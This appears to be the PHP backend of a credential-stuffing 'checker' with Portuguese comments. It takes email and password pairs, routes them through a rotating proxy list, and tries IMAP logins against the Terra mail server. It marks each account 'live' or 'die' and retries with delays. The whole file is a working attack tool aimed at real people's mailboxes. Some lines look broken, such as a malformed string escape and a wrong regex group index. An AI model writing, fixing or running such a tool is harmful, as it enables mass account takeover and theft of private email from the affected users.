<?php
error_reporting(0);
ini_set('display_errors', '0');
ini_set('max_execution_time', '120');
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$action = $_GET['action'] ?? '';

if ($action === 'init') {
    $proxies = [];
    $proxyFile = __DIR__ . '/proxies.txt';
    if (file_exists($proxyFile)) {
        $content = @file_get_contents($proxyFile);
        $lines = array_filter(array_map('trim', explode("\n", $content)));
        foreach ($lines as $line) {
            if (empty($line) || $line[0] === '#') continue;
            $proxies[] = $line;
        }
    }
    echo json_encode(['status' => 'ok', 'proxies' => array_values(array_unique($proxies))]);
    exit;
}

if ($action === 'test_proxy') {
    $proxy = $_POST['proxy'] ?? '';
    if (empty($proxy)) { echo json_encode(['status' => 'fail']); exit; }
    $ok = testProxyHttps($proxy);
    echo json_encode(['status' => $ok ? 'ok' : 'fail']);
    exit;
}

if ($action === 'check') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $proxy = $_POST['proxy'] ?? '';
    if ($email === '' || $password === '') {
        echo json_encode(['status' => 'die', 'email' => $email, 'reason' => 'Vazio']);
        exit;
    }
    try {
        echo json_encode(doValidate($email, $password, $proxy));
    } catch (\Throwable $e) {
        echo json_encode(['status' => 'die', 'email' => $email, 'reason' => 'Erro']);
    }
    exit;
}

echo json_encode(['status' => 'ok']);
exit;

// ═══════════════════════════════════════
//  PARSER DE PROXY
// ═══════════════════════════════════════

function parseProxy(string $proxy): array {
    $host = '';
    $port = 0;
    $user = '';
    $pass = '';

    // socks5://user:pass@host:port
    if (preg_match('/^socks[45]h?:\/\/([^:@]+):([^@]+)@([^:]+):(\d+)$/i', $proxy, $m)) {
        $user = $m[1]; $pass = $m[2]; $host = $m[3]; $port = (int)$m[4];
    }
    // http://user:pass@host:port
    elseif (preg_match('/^https?:\/\/([^:@]+):([^@]+)@([^:]+):(\d+)$/i', $proxy, $m)) {
        $user = $m[1]; $pass = $m[2]; $host = $m[3]; $port = (int)$m[4];
    }
    // user:pass@host:port
    elseif (preg_match('/^([^:@]+):([^@]+)@([^:]+):(\d+)$/', $proxy, $m)) {
        $user = $m[1]; $pass = $m[2]; $host = $m[3]; $port = (int)$m[4];
    }
    // host:port
    elseif (preg_match('/^([^:]+):(\d+)$/', $proxy, $m)) {
        $host = $m[1]; $port = (int)$m[4];
    }

    return ['host' => $host, 'port' => $port, 'user' => $user, 'pass' => $pass];
}

// ═══════════════════════════════════════
//  TESTE DE PROXY (HTTPS simples)
// ═══════════════════════════════════════

function testProxyHttps(string $proxy): bool {
    if (!extension_loaded('curl')) return false;
    $p = parseProxy($proxy);
    if (empty($p['host'])) return false;

    $ch = curl_init();
    $opts = [
        CURLOPT_URL => 'https://api.ipify.org/',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_NOSIGNAL => 1,
        CURLOPT_PROXY => $p['host'] . ':' . $p['port'],
    ];

    if (strpos(strtolower($proxy), 'socks') === 0) {
        $opts[CURLOPT_PROXYTYPE] = defined('CURLPROXY_SOCKS5_HOSTNAME') ? CURLPROXY_SOCKS5_HOSTNAME : 7;
    } else {
        $opts[CURLOPT_PROXYTYPE] = CURLPROXY_HTTP;
    }

    if (!empty($p['user'])) {
        $opts[CURLOPT_PROXYUSERPWD] = $p['user'] . ':' . $p['pass'];
    }

    curl_setopt_array($ch, $opts);
    $result = curl_exec($ch);
    curl_close($ch);

    return ($result !== false && strlen(trim($result)) > 0);
}

// ═══════════════════════════════════════
//  VALIDAÇÃO
// ═══════════════════════════════════════

function doValidate(string $email, string $password, string $proxy = ''): array {
    $timeout = 20;
    $delays = [0, 3000000, 6000000, 10000000, 15000000];

    for ($attempt = 0; $attempt < 5; $attempt++) {
        if ($delays[$attempt] > 0) usleep($delays[$attempt]);

        // COM proxy: usa SOCKS5 manual (não cURL IMAP)
        if (!empty($proxy)) {
            $r = trySocksImap($email, $password, $timeout, $proxy);
            if ($r !== null) return $r;
        }

        // SEM proxy: cURL + socket direto
        if (empty($proxy)) {
            if (extension_loaded('curl')) {
                $r = tryCurlDirect($email, $password, $timeout);
                if ($r !== null) return $r;
            }
            $r = trySocketDirect($email, $password, $timeout);
            if ($r !== null) return $r;
        }
    }

    return ['status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'retry_exhausted' => true];
}

// ═══════════════════════════════════════
//  SOCKS5 + TLS + IMAP (IMPLEMENTAÇÃO MANUAL)
//  Contorna o bug do cURL IMAP com SOCKS5
// ═══════════════════════════════════════

function trySocksImap(string $email, string $password, int $timeout, string $proxy): ?array {
    $p = parseProxy($proxy);
    if (empty($p['host']) || empty($p['port'])) return null;

    // 1. Conectar ao proxy via TCP
    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
    if ($socket === false) return null;

    stream_set_timeout($socket, $timeout);

    // 2. SOCKS5 greeting - oferecer user/pass auth (0x02) e no-auth (0x00)
    fwrite($socket, "\x05\x02\x00\x02");
    $greeting = @fread($socket, 2);
    if (strlen($greeting) < 2) { fclose($socket); return null; }

    $method = ord($greeting[1]);

    // 3. Autenticação user/pass se solicitado
    if ($method === 0x02) {
        $user = $p['user'];
        $pass = $p['pass'];
        $authPacket = chr(0x01) . chr(strlen($user)) . $user . chr(strlen($pass)) . $pass;
        fwrite($socket, $authPacket);
        $authResp = @fread($socket, 2);
        if (strlen($authResp) < 2 || ord($authResp[1]) !== 0x00) { fclose($socket); return null; }
    } elseif ($method !== 0x00) {
        fclose($socket); return null;
    }

    // 4. SOCKS5 CONNECT para imap.terra.com.br:993
    $target = 'imap.terra.com.br';
    $targetPort = 993;
    $connectReq = "\x05\x01\x00\x03" . chr(strlen($target)) . $target . pack('n', $targetPort);
    fwrite($socket, $connectReq);

    // Ler resposta (mínimo 10 bytes)
    $resp = '';
    $deadline = microtime(true) + $timeout;
    while (strlen($resp) < 10 && !feof($socket) && microtime(true) < $deadline) {
        $chunk = @fread($socket, 10 - strlen($resp));
        if ($chunk === false || $chunk === '') break;
        $resp .= $chunk;
    }
    if (strlen($resp) < 10 || ord($resp[1]) !== 0x00) { fclose($socket); return null; }

    // 5. Ativar TLS no socket
    $cryptoOk = @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
    if ($cryptoOk !== true) { fclose($socket); return null; }

    // 6. Ler greeting IMAP
    $imapGreeting = @fgets($socket, 8192);
    if (!$imapGreeting || stripos($imapGreeting, 'OK') === false) { fclose($socket); return null; }

    // 7. IMAP LOGIN
    $safe_email = str_replace(['\', '"'], ['\\', '\"'], $email);
    $safe_pass = str_replace(['\', '"'], ['\\', '\"'], $password);
    fwrite($socket, "A1 LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n");

    // 8. Ler resposta
    $response = '';
    $deadline2 = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) break;
        $response .= $line;
        if (strpos(trim($line), 'A1 ') === 0) break;
        if (microtime(true) > $deadline2) break;
    }

    @fwrite($socket, "A2 LOGOUT\r\n");
    fclose($socket);

    if (preg_match('/A1\s+OK/i', $response)) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
    if (preg_match('/A1\s+NO/i', $response)) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    if (preg_match('/A1\s+BAD/i', $response)) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    return null;
}

// ═══════════════════════════════════════
//  CONEXÃO DIRETA (sem proxy)
// ═══════════════════════════════════════

function tryCurlDirect(string $email, string $password, int $timeout): ?array {
    if (!extension_loaded('curl')) return null;
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'imaps://imap.terra.com.br:993/INBOX',
        CURLOPT_USERNAME => $email,
        CURLOPT_PASSWORD => $password,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_CONNECTTIMEOUT => $timeout,
        CURLOPT_NOSIGNAL => 1,
    ]);
    $result = curl_exec($ch);
    $errno = curl_errno($ch);
    curl_close($ch);
    if ($errno === 67) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    if ($result !== false) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
    return null;
}

function trySocketDirect(string $email, string $password, int $timeout): ?array {
    $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
    if ($socket === false) return null;
    stream_set_timeout($socket, $timeout);
    $greeting = @fgets($socket, 8192);
    if (!$greeting || stripos($greeting, 'OK') === false) { fclose($socket); return null; }
    $safe_email = str_replace(['\', '"'], ['\\', '\"'], $email);
    $safe_pass = str_replace(['\', '"'], ['\\', '\"'], $password);
    fwrite($socket, "A1 LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n");
    $response = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) break;
        $response .= $line;
        if (strpos(trim($line), 'A1 ') === 0) break;
        if (microtime(true) > $deadline) break;
    }
    @fwrite($socket, "A2 LOGOUT\r\n");
    fclose($socket);
    if (preg_match('/A1\s+OK/i', $response)) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
    if (preg_match('/A1\s+NO/i', $response)) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    if (preg_match('/A1\s+BAD/i', $response)) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
    return null;
}
